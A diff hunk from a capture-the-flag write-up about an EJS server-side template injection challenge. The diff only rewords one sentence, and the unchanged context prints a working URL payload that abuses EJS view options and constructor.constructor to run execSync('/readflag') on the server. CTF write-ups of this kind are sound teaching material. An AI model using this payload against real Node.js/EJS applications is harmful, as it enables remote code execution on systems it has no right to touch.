@@ -57,7 +57,7 @@ This is a Node.js Express server application that uses the EJS templating engine
 ```
 
 ## How to Solve?
-At first, we are using this [website](https://eslam.io/posts/ejs-server-side-template-injection-rce/) to perform Remote Code Execution, but `outputFunctionName` is blacklisted. Therefore, we need to find another working payload. Finally, I found another working payload after doing some googling. (Check out this [website](https://blog.z3ratu1.cn/hxpCTF2022wp.html)). Here is the final payload that I used to solve this challenge:
+At first, we are using this [website](https://eslam.io/posts/ejs-server-side-template-injection-rce/) to perform Remote Code Execution, but `outputFunctionName` is blacklisted. Therefore, we need to find another working payload. Finally, I found another working payload after doing some googling. (Check out this [website](https://blog.z3ratu1.cn/hxpCTF2022wp.html)). Here is the final payload I used to solve this challenge:
 
 ```
 http://ejs.web.seetf.sg:1337/greet?name=test&font=test&fontSize=test&settings[view%20options][client]=1&settings[view%20options][escape]=%7B%7D.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27)%22)
